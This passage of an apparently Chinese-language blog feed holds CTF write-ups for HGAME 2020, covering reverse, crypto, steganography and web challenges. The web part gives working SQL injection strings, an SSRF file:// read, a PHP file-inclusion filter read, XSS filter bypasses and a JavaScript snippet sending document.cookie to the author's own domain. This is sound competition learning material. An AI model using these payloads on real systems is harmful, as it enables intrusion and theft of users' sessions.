rel="noopener">reverse_mt_rand.py</a><br>脚本流程是，先访问<a href="https://twoshot.hgame.n3ko.co/random.php?times=228" target="_blank" rel="noopener">https://twoshot.hgame.n3ko.co/random.php?times=228</a><br>也就是抽卡228次<br>之后利用上面的脚本，有如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 ./reverse_mt_rand.py randnum[0] randnum[227] 0 0</span><br></pre></td></tr></table></figure></p><p>所产生的值就是seed，也就是cdkey<br>利用os.popen()方法向<a href="https://twoshot.hgame.n3ko.co/verify.php" target="_blank" rel="noopener">https://twoshot.hgame.n3ko.co/verify.php</a><br>post以上payload就可以得到返回结果</p><h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><p><img src="00.png" alt=""><br>进行交易时容易形成条件竞争<br>那么我们先购入一件商品，在出售的时候形成条件竞争，在库存还未来得及变化的情况下将统一商品反复出售，之后写个脚本(不知道为啥用burpsuite钱还是没变化- -)<br><a href="https://blog.csdn.net/drdairen/article/details/60962439" target="_blank" rel="noopener">python：threading.Thread类的使用详解</a><br>脚本的构成是，对于buy和solve这两个行为定义两个函数，传入cookie值以及data(data中包含了commodity信息-code&amp;amount)，后面利用threading.Thread类进行多线程(- -)  </p><p>  之后不打算写了- -很多题也有很详细的wp了，本质上我也是看wp复现的(是的就是这么菜)</p><h3 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h3><p><a href="https://www.lsablog.com/networksec/penetration/time-based-blind-sqli/" target="_blank" rel="noopener">sql盲注之时间盲注</a></p><h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>script被过滤为空，双写绕过。输入后控制台发现异常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &apos;self&apos;&quot;. Either the &apos;unsafe-inline&apos; keyword, a hash (&apos;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=&apos;), or a nonce (&apos;nonce-...&apos;) is required to enable inline execution.</span><br></pre></td></tr></table></figure></p><p>key word:CSP<br><a href="https://zhuanlan.zhihu.com/p/94246164" target="_blank" rel="noopener">CTF|有关CSP绕过的方法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vidar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2020week2_wp</title>
      <link href="/2020/02/14/hgame2020week2-wp/"/>
      <url>/2020/02/14/hgame2020week2-wp/</url>
      
        <content type="html"><![CDATA[<p>凉了啊凉了啊  </p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h2><p>下载文件是个字节码，手动翻译一下，大概是这个样子<br><a href="https://anhkgg.com/python-bytecode/" target="_blank" rel="noopener">参考网址</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tmp1=flag[::<span class="number">-1</span>]</span><br><span class="line">tmp2=list(tmp1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(tmp2)):</span><br><span class="line">tmp3=tmp2[i<span class="number">-1</span>]^tmp2[i]       </span><br><span class="line">tmp2[i]=tmp3</span><br><span class="line"></span><br><span class="line">res=bytes(tmp2).hex</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p><p>根据异或公式，可得m[i]= cipher[i] ^ cipher[i-1]<br>于是有如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher=bytes().fromhex(<span class="string">'7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22'</span>)</span><br><span class="line">_cipher=list(cipher)</span><br><span class="line">m=<span class="string">b'&#125;                                        '</span></span><br><span class="line">_m=list(m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(_cipher)):</span><br><span class="line">tmp=_cipher[i]^_cipher[i<span class="number">-1</span>]</span><br><span class="line">_m[i]=tmp</span><br><span class="line">flag=bytes(_m[::<span class="number">-1</span>])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Verfication-code"><a href="#Verfication-code" class="headerlink" title="Verfication_code"></a>Verfication_code</h2><p>由源码得sha256(xxxx+已知字符串)=已知密文，爆破求xxxx，输入后再输入I like playing Hgame<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os, sys, signal</span><br><span class="line"><span class="keyword">import</span> string, random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">myStr=<span class="string">'L0ZzlogdBWx1hlXC'</span></span><br><span class="line">dstDigest=<span class="string">'236abe814ce3691e1d5959bd36b79ca31e3d31b6daf941fa60d2fb7f9a01b61d'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(string.ascii_letters+string.digits,<span class="number">4</span>):</span><br><span class="line">proof=<span class="string">''</span>.join(i)+myStr</span><br><span class="line">digest=sha256(proof.encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span>(digest==dstDigest):</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Cosmos的午餐"><a href="#Cosmos的午餐" class="headerlink" title="Cosmos的午餐"></a>Cosmos的午餐</h2><p>(感谢出题人的耐心解答)<br>一开始以为在流量包里找png或者jpeg之类的，但是相关的提取出来感觉不太对劲…（根据题目图片应该是二次元妹子…)<br>先把log导入解密，在http中找，发现一个比较不一样的包<br><img src="wp2_img/01.png" alt=""><br>点进去看看发现含有zip文件格式，导出来看下里边有张图片，提示用outguess，并且备注里给了key，然后解密下就好，解完了是个网址，下载下来一个压缩包，里边的图片二维码扫一下就行</p><h2 id="所见即为假"><a href="#所见即为假" class="headerlink" title="所见即为假"></a>所见即为假</h2><p>发现7z可以直接解压，注释中的F5 key提示了F5隐写，于是利用F5-steganography<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract ./11.jpg -e res -p NllD7CQon6dBsFLr</span><br></pre></td></tr></table></figure></p><p>得到hex文本，复制进winhex可得flag</p><h2 id="地球上最后的夜晚"><a href="#地球上最后的夜晚" class="headerlink" title="地球上最后的夜晚"></a>地球上最后的夜晚</h2><p>解压得no password.pdf，想到pdf隐写，用wbStego4.3open解码得到一个txt文件，里边写着zip的解压密码，解压得一个doc文件，试试转成xml，用7z对doc解压后进入word文件夹，发现secret.xml，打开就是flag</p><h2 id="玩玩条码"><a href="#玩玩条码" class="headerlink" title="玩玩条码"></a>玩玩条码</h2><p>下载得一个zip，里边注释:Decode JPNPostCode to get MSUStegoVideo password<br>俩文件对应注释里边内容，先看postcode，这是个日本的邮政编码，我是在生成条码网站上手动对比，一个个试的，不过也不复杂，有规律<br><a href="https://cn.online-qrcode-generator.com/japanpost-barcode-generator" target="_blank" rel="noopener">日本邮政条形码生成器</a><br><img src="wp2_img/00.png" alt=""><br>第二个，根据提示下了virtualdub2，再安MSU StegoVideo 插件，这个只能运行32位的，打开后根据网上教程，输入上一步骤所得的码进行解码，<a href="https://blog.csdn.net/wy_bk/article/details/85217583" target="_blank" rel="noopener">使用 MSU StegoVideo</a><br>打开txt文件可得zip密码，7z解压后得条形码，在线扫一下就好<br><a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">Free Online Barcode Reader</a>  </p><h1 id="赛后复现"><a href="#赛后复现" class="headerlink" title="赛后复现"></a>赛后复现</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><p>看到<a href="http://cosmos-admin.hgame.day-day.work/?action=login.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/?action=login.php</a><br>这样的字样，想到可能是php伪协议<br><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">文件包含漏洞与php伪协议</a><br>于是输入<a href="http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php</a><br>解码后得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以注意到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;var_dump($$debug);&quot;);</span><br></pre></td></tr></table></figure></p><p>eval()与$$debug都是需要注意的点  对于$$debug来说,在这里我们的$$debug就是可变变量,在这里$$debug就表示$($debug的值),同时$GLOBALS — 引用全局作用域中可用的全部变量,想着$GLOBALS能打印出我们所需要的username与password,于是传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cosmos-admin.hgame.day-day.work/?action=login.php&amp;debug=GLOBALS</span><br></pre></td></tr></table></figure></p><p>出现<br><img src="wp2_img/02.png" alt=""><br>从<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$admin_password == md5($_POST[&apos;password&apos;])</span><br></pre></td></tr></table></figure></p><p>可以知道这是一个弱比较，所以我们只要传入md5开头是0e的字符串,0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0<br>成功登入之后再看下admin.php的源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>意思是要传入一个url且必须从localhost或者timgsa.baidu.com开始<br>curl有http和file两种协议，当<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">时,会直接读取/etc/password的内容，题目说明了flag在根目录下，所以在图片url处插入</span><br><span class="line">```file://localhost/flag```，然后用burpsuite借包查看返回的base64值</span><br><span class="line"></span><br><span class="line">### Cosmos的留言板-1</span><br><span class="line">先测试一下，发现过滤了select和空格</span><br><span class="line">[sql注入_过滤空格和注释符](https://www.cnblogs.com/peterpan0707007/p/7501507.html)</span><br><span class="line">select可以通过大小写绕过，空格可以用/\*\*/代替,爆表```&apos;/**/union/**/select/**/concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>得到:f1aggggggggggggg<br>爆段名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到:fl4444444g</span><br><span class="line">爆值</span><br><span class="line">```&apos;/**/union/**/seLect/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having/**/&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = file_get_contents(&apos;mycode&apos;);</span><br><span class="line">eval($code);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JzgCoycIGwIBr0qhJ1IQn05IoQWnoxb1GyuFryOLJ2cBEIV2G2gXZ05LFw4=</span><br></pre></td></tr></table></figure><p>qwq居然访问/mycode就可以得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(encrypt(strrev(str_rot13(encrypt(base64_encode(strrev(strrev(str_rot13(base64_encode(base64_encode($_SERVER[<span class="string">'token'</span>])))))))))));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(@$_POST[<span class="string">'token'</span>] === $_SERVER[<span class="string">'token'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span>($_SERVER[<span class="string">'flag'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>意思就是发送的token要和解密后的server的token一致,但是发现每刷新一次，加密的方法与顺序都会变，所以要写脚本来实现解密，思路是得到源码中对token加密的这一行，再通过字符串比较判断所使用的函数<br><a href="https://python3webspider.cuiqingcai.com/" target="_blank" rel="noopener">python3网络爬虫开发实战</a><br>(什么都不会的感觉太惨了= =)<br>顺手贴一个小语的wp来学习qwq<br><a href="http://www.xi4oyu.top/1966f4b8/#more" target="_blank" rel="noopener">Hgame-week2-writeup</a><br>写脚本(照抄小语的)- -大概就是给自己加深下印象的…<br>不知道为啥= =试了好几次都不行，出现各种错误，后来突然又行了…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#py3</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">se=Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the encode</span></span><br><span class="line">url=<span class="string">'http://c339168464.php.hgame.n3ko.co/'</span></span><br><span class="line">r = se.get(url)</span><br><span class="line">html = etree.HTML(r.text)</span><br><span class="line">enc_code=html.xpath(<span class="string">'//html/body/text()'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the method</span></span><br><span class="line">_url=<span class="string">'http://c339168464.php.hgame.n3ko.co/mycode'</span></span><br><span class="line">_r=se.get(_url)</span><br><span class="line">_html = etree.HTML(_r.text)</span><br><span class="line">p = <span class="string">r'echo\((.*)\(\$_SERVER'</span><span class="comment">#转义字符r,通过正则选取范围</span></span><br><span class="line">method=re.search(p,_r.text).group(<span class="number">1</span>).split(<span class="string">'('</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> s:</span><br><span class="line">        c = ord(v)</span><br><span class="line">        <span class="keyword">if</span> c &gt;= ord(<span class="string">'a'</span>) <span class="keyword">and</span> c &lt;= ord(<span class="string">'z'</span>):</span><br><span class="line">            <span class="keyword">if</span> c &gt; ord(<span class="string">'m'</span>):</span><br><span class="line">                c -= <span class="number">13</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c += <span class="number">13</span></span><br><span class="line">        <span class="keyword">elif</span> c &gt;= ord(<span class="string">'A'</span>) <span class="keyword">and</span> c &lt;= ord(<span class="string">'Z'</span>):</span><br><span class="line">            <span class="keyword">if</span> c &gt; ord(<span class="string">'M'</span>):</span><br><span class="line">                c -= <span class="number">13</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c += <span class="number">13</span></span><br><span class="line">        result += chr(c)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        res+=chr(ord(ch)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> method:</span><br><span class="line">    <span class="keyword">if</span> m == <span class="string">'base64_encode'</span>:</span><br><span class="line">        enc_code=base64.b64decode(enc_code)</span><br><span class="line">    <span class="keyword">elif</span> m ==<span class="string">'encrypt'</span>:</span><br><span class="line">        enc_code=decrypt(enc_code)</span><br><span class="line">    <span class="keyword">elif</span> m ==<span class="string">'str_rot13'</span>:</span><br><span class="line">        enc_code=rot13(enc_code)</span><br><span class="line">    <span class="keyword">elif</span> m == <span class="string">'strrev'</span>:</span><br><span class="line">        enc_code=enc_code[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the response</span></span><br><span class="line">r_=se.post(<span class="string">'http://c339168464.php.hgame.n3ko.co/'</span>,data=&#123;<span class="string">'token'</span>: enc_code&#125;)</span><br><span class="line">flag=r_.text</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><p>点击Flag is here的button后，出现提示<br><img src="wp2_img/03.png" alt=""><br>那么应该是通过xss获取管理员cookie<br><a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#cookies" target="_blank" rel="noopener">ctf_web_cookie窃取</a><br>当我们输入标签&lt;\img>时，查看源代码发现标签被过滤，通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br></pre></td></tr></table></figure></p><p>注释掉后面的<span>,而浏览器的容错性允许我们最后不用加&gt;来闭合标签<br><a href="https://zhuanlan.zhihu.com/p/75619278" target="_blank" rel="noopener">Xss小游戏通关秘籍</a><br><a href="https://www.kingkk.com/2018/08/xss%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">xss练习记录</a><br>于是我们发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&lt;!--</span><br></pre></td></tr></table></figure></span></p><p>源代码中显示<img src="wp2_img/04.png" alt=""><br>发现这个alert变大写了，采用html实体编码绕过(对alert进行unicode编码)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#49;&amp;#34;&amp;#41;&quot;&lt;!--</span><br></pre></td></tr></table></figure></p><p>发现可以成功执行。<br>对于md5(code)[:6] == 11036f来说，要求md5值的前六位要做到相等。<br><a href="http://www.pdsdt.lovepdsdt.com/index.php/2020/02/04/hgame-2020-web/#Cosmos-3" target="_blank" rel="noopener">Hgame-2020——WEB</a><br>对验证码有<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#py3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100000000</span>):</span><br><span class="line">    <span class="comment">#s = hashlib.md5(str(i)).hexdigest()[0:8]</span></span><br><span class="line">    <span class="comment">#s = hashlib.md5(str(i)).hexdigest()[:6]</span></span><br><span class="line">    s = hashlib.md5(str(i).encode(<span class="string">"utf-8"</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">"db97b8"</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><a href="https://github.com/vidar-team/Hgame2020_writeup/tree/master/week2" target="_blank" rel="noopener">hgame2020week2_offical</a><br>之后就直接看官方wp了- -还有小语的wp(靠小语wp过日子)<br>其实验证码应该是7-8位(- -以我有限的样本来说)<br><a href="http://www.xi4oyu.top/1966f4b8/" target="_blank" rel="noopener">xiaoyu的wp</a><br>关于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src=&apos;http://我的域名/?token=&apos;+document.cookie;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p><p>有<br><a 